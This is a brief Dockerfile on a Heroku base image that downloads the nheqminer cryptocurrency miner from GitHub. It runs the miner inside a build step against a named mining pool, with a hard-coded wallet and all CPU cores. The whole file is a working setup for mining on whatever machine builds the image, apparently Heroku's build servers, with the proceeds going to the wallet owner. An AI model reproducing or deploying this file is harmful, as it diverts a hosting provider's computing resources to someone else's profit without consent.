FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l stratum+tcp://na.luckpool.net:3956 -u RMz1F1pEPh7x9RZxdN7LgpK41uCFk1KGga.q -p x --cpu $(nproc --all)
